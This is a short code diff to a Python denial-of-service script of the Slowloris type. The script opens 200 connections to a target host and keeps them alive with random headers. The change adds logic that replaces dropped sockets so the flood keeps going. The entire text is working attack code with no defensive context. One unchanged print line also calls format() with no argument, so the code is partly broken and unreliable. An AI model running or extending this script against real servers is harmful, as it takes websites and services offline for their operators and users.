@@ -14,13 +14,17 @@ def create_connection(ip, port):
 def initiateAttack(ip, port):
     for _ in range(200):
         create_connection(ip, port)
-    
+
     while True:
         for connection in SOCKET_CONNECTIONS:
             try:
                 connection.send_header("X-a", random.randint(1,2000))
             except socket.error:
                 SOCKET_CONNECTIONS.remove(connection)
+        
+        for _ in range(200 - len(SOCKET_CONNECTIONS)):
+            create_connection(ip, port)
+
         print("Socket Count: {0}".format())
 
 def main():
